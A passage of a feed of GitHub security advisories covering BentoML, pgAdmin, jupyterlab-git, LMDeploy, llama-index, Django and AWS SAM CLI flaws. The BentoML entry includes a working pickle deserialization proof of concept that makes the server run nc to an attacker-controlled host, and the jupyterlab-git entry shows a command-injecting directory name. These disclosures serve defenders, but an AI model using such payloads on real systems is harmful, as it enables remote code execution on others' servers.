<p>This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 15 days after the fix was made available. Regardless of this disclosure process, XBOW may privately notify other affected parties as soon as we become aware of this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lnbits/lnbits/security/advisories/GHSA-qp8j-p87f-c8cc">https://github.com/lnbits/lnbits/security/advisories/GHSA-qp8j-p87f-c8cc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32013">https://nvd.nist.gov/vuln/detail/CVE-2025-32013</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/lnbits/PYSEC-2025-16.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/lnbits/PYSEC-2025-16.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-qp8j-p87f-c8cc">https://github.com/advisories/GHSA-qp8j-p87f-c8cc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qp8j-p87f-c8cc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-07T16:54:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bentoml] BentoML Allows Remote Code Execution (RCE) via Insecure Deserialization]]></title>
        <id>https://github.com/advisories/GHSA-33xw-247w-6hmc</id>
        <link href="https://github.com/advisories/GHSA-33xw-247w-6hmc"/>
        <updated>2025-04-04T16:05:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified in the latest version(v1.4.2) of BentoML. It allows any unauthenticated user to execute arbitrary code on the server.</p>
<h3 id="details">Details</h3>
<p>It exists an unsafe code segment in <code>serde.py</code>: </p>
<pre><code class="language-Python">def deserialize_value(self, payload: Payload) -&gt; t.Any:
    if "buffer-lengths" not in payload.metadata:
        return pickle.loads(b"".join(payload.data))
</code></pre>
<p>Through data flow analysis, it is confirmed that the <code>payload </code>content is sourced from an HTTP request, which can be fully manipulated by the attack. Due to the lack of validation in the code, maliciously crafted serialized data can execute harmful actions during deserialization.</p>
<h3 id="poc">PoC</h3>
<p>Environment:</p>
<ul>
<li>Server host:<ul>
<li>IP: 10.98.36.123</li>
<li>OS: Ubuntu</li>
</ul>
</li>
<li>Attack host:<ul>
<li>IP: 10.98.36.121</li>
<li>OS: Ubuntu</li>
</ul>
</li>
</ul>
<ol>
<li>Follow the instructions on the BentoML official README(<a href="https://github.com/bentoml/BentoML">https://github.com/bentoml/BentoML</a>) to set up the environment.</li>
</ol>
<p>1.1 Install BentoML (Server host: 10.98.36.123) :
<code> pip install -U bentoml</code></p>
<p>1.2 Define APIs in a <code>service.py</code> file (Server host: 10.98.36.123) :</p>
<pre><code class="language-Python">from __future__ import annotations

import bentoml

@bentoml.service(
    resources={"cpu": "4"}
)
class Summarization:
    def __init__(self) -&gt; None:
        import torch
        from transformers import pipeline

        device = "cuda" if torch.cuda.is_available() else "cpu"
        self.pipeline = pipeline('summarization', device=device)

    @bentoml.api(batchable=True)
    def summarize(self, texts: list[str]) -&gt; list[str]:
        results = self.pipeline(texts)
        return [item['summary_text'] for item in results]
</code></pre>
<p>1.3 Run the service code (Server host: 10.98.36.123) :</p>
<pre><code class="language-Bash">pip install torch transformers  # additional dependencies for local run

bentoml serve
</code></pre>
<ol start="2">
<li><p>Start nc listening on the attacking host (Attack host: 10.98.36.121) :
<code>nc -lvvp 1234</code></p>
</li>
<li><p>Send maliciously crafted request (Attack host: 10.98.36.121) :</p>
</li>
</ol>
<pre><code class="language-Python">import pickle
import os
import requests

headers = {'Content-Type': 'application/vnd.bentoml+pickle'}

class Evil:
    def __reduce__(self):
        return(os.system, ('nc 10.98.36.121 1234',))

payload = pickle.dumps(Evil())

requests.post("http://10.98.36.123:3000/summarize", data=payload, headers=headers)
</code></pre>
<ol start="4">
<li>Attack success (Attack host: 10.98.36.121) :
The server host(10.98.36.123) has connected to the attacker's host(10.98.36.121) listening on port 1234.
<img alt="nc" src="https://github.com/user-attachments/assets/858cba4a-6880-498f-b922-dd9a2dc78a85"></li>
</ol>
<h3 id="impact">Impact</h3>
<p>Remote Code Execution (RCE).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc">https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27520">https://nvd.nist.gov/vuln/detail/CVE-2025-27520</a></li>
<li><a href="https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194">https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194</a></li>
<li><a href="https://github.com/advisories/GHSA-33xw-247w-6hmc">https://github.com/advisories/GHSA-33xw-247w-6hmc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33xw-247w-6hmc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-04T16:05:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmdeploy] LMDeploy Improper Input Validation Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7vc5-mjwp-c8fq</id>
        <link href="https://github.com/advisories/GHSA-7vc5-mjwp-c8fq"/>
        <updated>2025-04-04T14:26:02.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in InternLM LMDeploy up to 0.7.1. It has been classified as critical. Affected is the function load_weight_ckpt of the file lmdeploy/lmdeploy/vl/model/utils.py of the component PT File Handler. The manipulation leads to deserialization. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3162">https://nvd.nist.gov/vuln/detail/CVE-2025-3162</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/issues/3255">https://github.com/InternLM/lmdeploy/issues/3255</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/issues/3255#issue-2918985270">https://github.com/InternLM/lmdeploy/issues/3255#issue-2918985270</a></li>
<li><a href="https://vuldb.com/?ctiid.303108">https://vuldb.com/?ctiid.303108</a></li>
<li><a href="https://vuldb.com/?id.303108">https://vuldb.com/?id.303108</a></li>
<li><a href="https://vuldb.com/?submit.542520">https://vuldb.com/?submit.542520</a></li>
<li><a href="https://github.com/advisories/GHSA-7vc5-mjwp-c8fq">https://github.com/advisories/GHSA-7vc5-mjwp-c8fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7vc5-mjwp-c8fq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-03T15:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pgadmin4] pgAdmin 4 Vulnerable to Cross-Site Scripting (XSS) via Query Result Rendering]]></title>
        <id>https://github.com/advisories/GHSA-2rrx-pphc-qfv9</id>
        <link href="https://github.com/advisories/GHSA-2rrx-pphc-qfv9"/>
        <updated>2025-04-04T14:23:57.000Z</updated>
        <content type="html"><![CDATA[<p>pgAdmin &lt;= 9.1 is affected by a security vulnerability with Cross-Site Scripting(XSS). If attackers&nbsp;execute any arbitrary HTML/JavaScript in a user's browser through query result rendering, then HTML/JavaScript runs on the browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2946">https://nvd.nist.gov/vuln/detail/CVE-2025-2946</a></li>
<li><a href="https://github.com/pgadmin-org/pgadmin4/issues/8602">https://github.com/pgadmin-org/pgadmin4/issues/8602</a></li>
<li><a href="https://github.com/pgadmin-org/pgadmin4/commit/1305d9910beefd0d6b4c7eb4f111f86edb1d356b">https://github.com/pgadmin-org/pgadmin4/commit/1305d9910beefd0d6b4c7eb4f111f86edb1d356b</a></li>
<li><a href="https://github.com/advisories/GHSA-2rrx-pphc-qfv9">https://github.com/advisories/GHSA-2rrx-pphc-qfv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2rrx-pphc-qfv9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-03T15:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pgadmin4] pgAdmin 4 Vulnerable to Remote Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-g73c-fw68-pwx3</id>
        <link href="https://github.com/advisories/GHSA-g73c-fw68-pwx3"/>
        <updated>2025-04-04T14:23:33.000Z</updated>
        <content type="html"><![CDATA[<p>Remote Code Execution security vulnerability in pgAdmin 4  (Query Tool and Cloud Deployment modules).</p>
<p>The vulnerability is associated with the 2 POST endpoints;&nbsp;/sqleditor/query_tool/download, where the query_commited parameter and&nbsp;/cloud/deploy endpoint, where the high_availability parameter is&nbsp;unsafely passed to the Python eval() function, allowing arbitrary code execution.</p>
<p>This issue affects pgAdmin 4: before 9.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2945">https://nvd.nist.gov/vuln/detail/CVE-2025-2945</a></li>
<li><a href="https://github.com/pgadmin-org/pgadmin4/issues/8603">https://github.com/pgadmin-org/pgadmin4/issues/8603</a></li>
<li><a href="https://github.com/pgadmin-org/pgadmin4/commit/75be0bc22d3d8d7620711835db817bd7c021007c">https://github.com/pgadmin-org/pgadmin4/commit/75be0bc22d3d8d7620711835db817bd7c021007c</a></li>
<li><a href="https://github.com/advisories/GHSA-g73c-fw68-pwx3">https://github.com/advisories/GHSA-g73c-fw68-pwx3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g73c-fw68-pwx3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-03T15:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterlab-git] jupyterlab-git has a command injection vulnerability in "Open Git Repository in Terminal"]]></title>
        <id>https://github.com/advisories/GHSA-cj5w-8mjf-r5f8</id>
        <link href="https://github.com/advisories/GHSA-cj5w-8mjf-r5f8"/>
        <updated>2025-04-04T14:05:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>On many platforms, a third party can create a Git repository under a name that includes a shell command substitution <a href="https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html">^1</a> string in the syntax <code>$(&lt;command&gt;)</code>. These directory names are allowed in macOS and a majority of Linux distributions <a href="https://www.gnu.org/software/libc/manual/html_node/File-Name-Portability.html">^2</a>. If a user starts <code>jupyter-lab</code> in a parent directory of this inappropriately-named Git repository, opens it, and clicks "Git &gt; Open Git Repository in Terminal" from the menu bar, then the injected command <code>&lt;command&gt;</code> is run in the user's shell without the user's permission.</p>
<p>This issue is occurring because when that menu entry is clicked, <code>jupyterlab-git</code> opens the terminal and runs <code>cd &lt;git-repo-path&gt;</code> through the shell to set the current directory <a href="https://github.com/jupyterlab/jupyterlab-git/blob/7eb3b06f0092223bd5494688ec264527bbeb2195/src/commandsAndMenu.tsx#L175-L184">^3</a>. Doing so runs any command substitution strings present in the directory name, which leads to the command injection issue described here. A previous patch provided an incomplete fix <a href="https://github.com/jupyterlab/jupyterlab-git/pull/1196">^4</a>.</p>
<h2 id="scope-of-impact">Scope of Impact</h2>
<p>This issue allows for arbitrary code execution via command injection. A wide range of actions are permitted by this issue, including but not limited to: modifying files, exfiltrating data, halting services, or compromising the server's security rules.</p>
<p>We have scanned the source code of <code>jupyterlab-git</code> for other command injection risks, and have not found any at the time of writing.</p>
<p>This issue was reproduced on the latest release of <code>jupyterlab-git</code>, v0.51.0. The steps taken to reproduce this issue are described in the "Proof-of-concept" section below.</p>
<h2 id="proof-of-concept">Proof-of-concept</h2>
<ol>
<li><p>Create a new directory via <code>mkdir test/ &amp;&amp; cd test/</code>.</p>
</li>
<li><p>Create a new Git repository under <code>test/</code> with a command substitution string in the directory name by running these commands:</p>
</li>
</ol>
<pre><code>mkdir '$(touch pwned.txt)'
cd '$(touch pwned.txt)/'
git init
cd ..
</code></pre>
<ol start="3">
<li>Start JupyterLab from <code>test/</code> by running jupyter lab.</li>
<li>With JupyterLab open in the browser, double click on <code>$(touch pwned.txt)</code> in the file browser.</li>
<li>From the top menu bar, click "Git &gt; Open Git Repository in Terminal".</li>
<li>Verify that <code>pwned.txt</code> is created under <code>test/</code>. This demonstrates the command injection issue described here.</li>
</ol>
<h2 id="proof-of-concept-mitigation">Proof-of-concept mitigation</h2>
<p>The issue can be mitigated by the patch shown below.</p>
<details><summary>Patch (click to expand)</summary>

<pre><code class="language-diff">diff --git a/src/commandsAndMenu.tsx b/src/commandsAndMenu.tsx
index 3779a6c..71ddcea 100644
--- a/src/commandsAndMenu.tsx
+++ b/src/commandsAndMenu.tsx
@@ -164,31 +164,13 @@ export function addCommands(
     label: trans.__('Open Git Repository in Terminal'),
     caption: trans.__('Open a New Terminal to the Git Repository'),
     execute: async args =&gt; {
-      const main = (await commands.execute(
-        'terminal:create-new',
-        args
-      )) as MainAreaWidget&lt;ITerminal.ITerminal&gt;;
+      const cwd = gitModel.pathRepository;
+      const main = (await commands.execute('terminal:create-new', {
+        ...args,
+        cwd
+      })) as MainAreaWidget&lt;ITerminal.ITerminal&gt;;
 
-      try {
-        if (gitModel.pathRepository !== null) {
-          const terminal = main.content;
-          terminal.session.send({
-            type: 'stdin',
-            content: [
-              `cd "${gitModel.pathRepository
-                .split('"')
-                .join('\\"')
-                .split('`')
-                .join('\\`')}"\n`
-            ]
-          });
-        }
-
-        return main;
-      } catch (e) {
-        console.error(e);
-        main.dispose();
-      }
+      return main;
</code></pre>
</details>

<p>This patch removes the <code>cd &lt;git-repo-path&gt;</code> shell command that causes the issue. To preserve the existing behavior, the <code>cwd</code> argument is set to <code>&lt;git-repo-path&gt;</code> when a terminal session is created via the <code>terminal:create-new</code> JupyterLab command. This preserves the existing application behavior while mitigating the command injection issue.</p>
<p>We have verified that this patch works when applied to a local installation of <code>jupyterlab-git</code>. We have also verified that the <code>cwd</code> argument is available in all versions of JupyterLab 4, so this patch should be fully backwards-compatible.</p>
<h2 id="workarounds">Workarounds</h2>
<p>We recommend that users upgrade to the patched versions listed on this GHSA. However, if a user is unable to upgrade, there are 3 different ways to mitigate this vulnerability without upgrading to a patch. </p>
<ol>
<li><p>Disable terminals on <code>jupyter-server</code> level:</p>
<pre><code>c.ServerApp.terminals_enabled =  False
</code></pre>
</li>
<li><p>Disable the terminals server extension:</p>
<pre><code>jupyter server extension disable jupyter_server_terminals
</code></pre>
</li>
<li><p>Disable the lab extension:</p>
<pre><code>jupyter labextension disable @jupyterlab/terminal-extension
</code></pre>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-cj5w-8mjf-r5f8">https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-cj5w-8mjf-r5f8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30370">https://nvd.nist.gov/vuln/detail/CVE-2025-30370</a></li>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/pull/1196">https://github.com/jupyterlab/jupyterlab-git/pull/1196</a></li>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/commit/b46482993f76d3a546015c6a94ebed8b77fc2376">https://github.com/jupyterlab/jupyterlab-git/commit/b46482993f76d3a546015c6a94ebed8b77fc2376</a></li>
<li><a href="https://github.com/jupyterlab/jupyterlab-git/blob/7eb3b06f0092223bd5494688ec264527bbeb2195/src/commandsAndMenu.tsx#L175-L184">https://github.com/jupyterlab/jupyterlab-git/blob/7eb3b06f0092223bd5494688ec264527bbeb2195/src/commandsAndMenu.tsx#L175-L184</a></li>
<li><a href="https://github.com/advisories/GHSA-cj5w-8mjf-r5f8">https://github.com/advisories/GHSA-cj5w-8mjf-r5f8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cj5w-8mjf-r5f8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-04T14:05:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llama-index-packs-finchat] llama-index-packs-finchat SQL Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-x48g-hm9c-ww42</id>
        <link href="https://github.com/advisories/GHSA-x48g-hm9c-ww42"/>
        <updated>2025-04-03T13:11:42.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in the FinanceChatLlamaPack of the llama-index-packs-finchat package, versions up to v0.3.0, allows for SQL injection in the <code>run_sql_query</code> function of the <code>database_agent</code>. This vulnerability can be exploited by an attacker to inject arbitrary SQL queries, leading to remote code execution (RCE) through the use of PostgreSQL's large object functionality.</p>
<p>The issue is resolved by no longer officially supporting the package and moving it into the <code>stale_packages</code> branch on the repo, this removing it from documentation etc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12909">https://nvd.nist.gov/vuln/detail/CVE-2024-12909</a></li>
<li><a href="https://github.com/run-llama/llama_index/commit/5d03c175476452db9b8abcdb7d5767dd7b310a75">https://github.com/run-llama/llama_index/commit/5d03c175476452db9b8abcdb7d5767dd7b310a75</a></li>
<li><a href="https://huntr.com/bounties/44e8177f-200a-4ba3-a12c-8bc21e313a3f">https://huntr.com/bounties/44e8177f-200a-4ba3-a12c-8bc21e313a3f</a></li>
<li><a href="https://github.com/run-llama/llama_index/tree/stale_packages/llama-index-packs/llama-index-packs-finchat">https://github.com/run-llama/llama_index/tree/stale_packages/llama-index-packs/llama-index-packs-finchat</a></li>
<li><a href="https://github.com/advisories/GHSA-x48g-hm9c-ww42">https://github.com/advisories/GHSA-x48g-hm9c-ww42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x48g-hm9c-ww42</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-20T12:32:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django Potential Denial of Service (DoS) on Windows ]]></title>
        <id>https://github.com/advisories/GHSA-wqfg-m96j-85vm</id>
        <link href="https://github.com/advisories/GHSA-wqfg-m96j-85vm"/>
        <updated>2025-04-09T20:02:07.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.1 before 5.1.8 and 5.0 before 5.0.14. The NFKC normalization is slow on Windows. As a consequence, django.contrib.auth.views.LoginView, django.contrib.auth.views.LogoutView, and django.views.i18n.set_language are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27556">https://nvd.nist.gov/vuln/detail/CVE-2025-27556</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://groups.google.com/g/django-announce">https://groups.google.com/g/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2025/apr/02/security-releases">https://www.djangoproject.com/weblog/2025/apr/02/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/2cb311f7b069723027fb5def4044d1816d7d2afd">https://github.com/django/django/commit/2cb311f7b069723027fb5def4044d1816d7d2afd</a></li>
<li><a href="https://github.com/django/django/commit/39e2297210d9d2938c75fc911d45f0e863dc4821">https://github.com/django/django/commit/39e2297210d9d2938c75fc911d45f0e863dc4821</a></li>
<li><a href="https://github.com/django/django/commit/8c6871b097b6c49d2a782c0d80d908bcbe2116f1">https://github.com/django/django/commit/8c6871b097b6c49d2a782c0d80d908bcbe2116f1</a></li>
<li><a href="https://github.com/django/django/commit/edc2716d01a6fdd84b173c02031695231bcee1f8">https://github.com/django/django/commit/edc2716d01a6fdd84b173c02031695231bcee1f8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/04/02/2">http://www.openwall.com/lists/oss-security/2025/04/02/2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-14.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-14.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-wqfg-m96j-85vm">https://github.com/advisories/GHSA-wqfg-m96j-85vm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wqfg-m96j-85vm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-02T15:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django Potential Denial of Service (DoS) on Windows ]]></title>
        <id>https://github.com/advisories/GHSA-wqfg-m96j-85vm</id>
        <link href="https://github.com/advisories/GHSA-wqfg-m96j-85vm"/>
        <updated>2025-04-09T20:02:07.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.1 before 5.1.8 and 5.0 before 5.0.14. The NFKC normalization is slow on Windows. As a consequence, django.contrib.auth.views.LoginView, django.contrib.auth.views.LogoutView, and django.views.i18n.set_language are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27556">https://nvd.nist.gov/vuln/detail/CVE-2025-27556</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://groups.google.com/g/django-announce">https://groups.google.com/g/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2025/apr/02/security-releases">https://www.djangoproject.com/weblog/2025/apr/02/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/2cb311f7b069723027fb5def4044d1816d7d2afd">https://github.com/django/django/commit/2cb311f7b069723027fb5def4044d1816d7d2afd</a></li>
<li><a href="https://github.com/django/django/commit/39e2297210d9d2938c75fc911d45f0e863dc4821">https://github.com/django/django/commit/39e2297210d9d2938c75fc911d45f0e863dc4821</a></li>
<li><a href="https://github.com/django/django/commit/8c6871b097b6c49d2a782c0d80d908bcbe2116f1">https://github.com/django/django/commit/8c6871b097b6c49d2a782c0d80d908bcbe2116f1</a></li>
<li><a href="https://github.com/django/django/commit/edc2716d01a6fdd84b173c02031695231bcee1f8">https://github.com/django/django/commit/edc2716d01a6fdd84b173c02031695231bcee1f8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/04/02/2">http://www.openwall.com/lists/oss-security/2025/04/02/2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-14.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-14.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-wqfg-m96j-85vm">https://github.com/advisories/GHSA-wqfg-m96j-85vm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wqfg-m96j-85vm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-02T15:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aws-sam-cli] AWS SAM CLI Path Traversal allows file copy to local cache]]></title>
        <id>https://github.com/advisories/GHSA-pp64-wj43-xqcr</id>
        <link href="https://github.com/advisories/GHSA-pp64-wj43-xqcr"/>
        <updated>2025-04-02T14:36:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/using-sam-cli.html">AWS Serverless Application Model Command Line Interface (AWS SAM CLI)</a> is an open-source CLI tool that helps Lambda developers to build and develop Lambda applications locally on their computers using Docker.</p>
<p>After completing a build with AWS SAM CLI which include symlinks, the content of those symlinks are copied to the cache of the local workspace as regular&nbsp;files&nbsp;or directories. As a result, a user who does not have access to those symlinks outside of the Docker container would now have access via the local workspace.</p>
<p>Users should <a href="https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/manage-sam-cli-versions.html#manage-sam-cli-versions-upgrade">upgrade to v1.134.0 or newer</a> and ensure any forked or derivative code is patched to incorporate the new fixes. After upgrading, users must re-build their applications using the <code>sam build --use-container</code> to update the symlinks.</p>
<h3 id="impact">Impact</h3>
<p>The issue is limited to the local workspace and does not affect AWS services, production environments or cross-account resources. The issue only affects workspaces using the AWS SAM CLI with container builds (--use-container),&nbsp;potentially allowing access to content of linked files in the SAM CLI cache.</p>
<p><strong>Impacted versions:</strong> &lt;= AWS SAM CLI v1.133.0</p>
<h3 id="patches">Patches</h3>
<p>The patches are included in AWS SAM CLI  version to v1.134.0 and newer. Users should upgrade and ensure any forked or derivative code is patched to incorporate the new fixes. After upgrading, users must re-build their applications using the <code>sam build --use-container</code> to update the symlinks</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no recommended work around. Customers are advised to upgrade to version v1.134.0 or the latest version.</p>
<h3 id="references">References</h3>
<p>CVE-2025-3048</p>
<hr>
<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="credit">Credit</h3>
<p>We would like to thank <a href="https://github.com/kevinbackhouse">Kevin Backhouse</a> with the GitHub Security Lab for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/aws-sam-cli/security/advisories/GHSA-pp64-wj43-xqcr">https://github.com/aws/aws-sam-cli/security/advisories/GHSA-pp64-wj43-xqcr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3048">https://nvd.nist.gov/vuln/detail/CVE-2025-3048</a></li>
<li><a href="https://github.com/aws/aws-sam-cli/pull/7890">https://github.com/aws/aws-sam-cli/pull/7890</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/AWS-2025-008">https://aws.amazon.com/security/security-bulletins/AWS-2025-008</a></li>
<li><a href="https://github.com/advisories/GHSA-pp64-wj43-xqcr">https://github.com/advisories/GHSA-pp64-wj43-xqcr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pp64-wj43-xqcr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T22:36:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aws-sam-cli] AWS SAM CLI Path Traversal allows file copy to build container]]></title>
        <id>https://github.com/advisories/GHSA-px37-jpqx-97q9</id>
        <link href="https://github.com/advisories/GHSA-px37-jpqx-97q9"/>
        <updated>2025-04-02T14:35:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/using-sam-cli.html">AWS Serverless Application Model Command Line Interface (AWS SAM CLI)</a> is an open-source CLI tool that helps Lambda developers to build and develop Lambda applications locally on their computers using Docker.</p>
<p>When running the AWS SAM CLI build process with Docker and symlinks are included in the build files, the container environment allows a user to access privileged files on the host by leveraging the elevated permissions granted to the tool. A user could leverage the elevated permissions to access restricted files via symlinks and copy them to a more permissive location on the container.</p>
<p>Users should <a href="https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/manage-sam-cli-versions.html#manage-sam-cli-versions-upgrade">upgrade to v1.133.0</a> or newer and ensure any forked or derivative code is patched to incorporate the new fixes. </p>
<h3 id="impact">Impact</h3>
<p>This issue is limited to the local workspace and does not affect AWS services, production environments or cross-account resources. The issue only affects local workspaces using AWS SAM CLI with container builds (--use-container), potentially allowing access to local files outside the build directory through the usage of symlinks. </p>
<p><strong>Impacted versions:</strong> &lt;= AWS SAM CLI v1.132.0</p>
<h3 id="patches">Patches</h3>
<p>The issue has been addressed in version 1.133.0. Users should upgrade and ensure any forked or derivative code is patched to incorporate the new fixes. To retain the previous behavior and allow symlinks to resolve on the host machine, please use the explicit '-<a href="https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/sam-cli-command-reference-sam-build.html#ref-sam-cli-build-options-mount-symlinks">-mount-symlinks</a>' parameter.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no recommended work around. Customers are advised to upgrade to version v1.133.0 or the latest version.</p>
<h3 id="references">References</h3>
<p>CVE-2025-3047</p>
<hr>
<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="credit">Credit</h3>
<p>We would like to thank <a href="https://github.com/kevinbackhouse">Kevin Backhouse</a> with the GitHub Security Lab for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/aws-sam-cli/security/advisories/GHSA-px37-jpqx-97q9">https://github.com/aws/aws-sam-cli/security/advisories/GHSA-px37-jpqx-97q9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3047">https://nvd.nist.gov/vuln/detail/CVE-2025-3047</a></li>
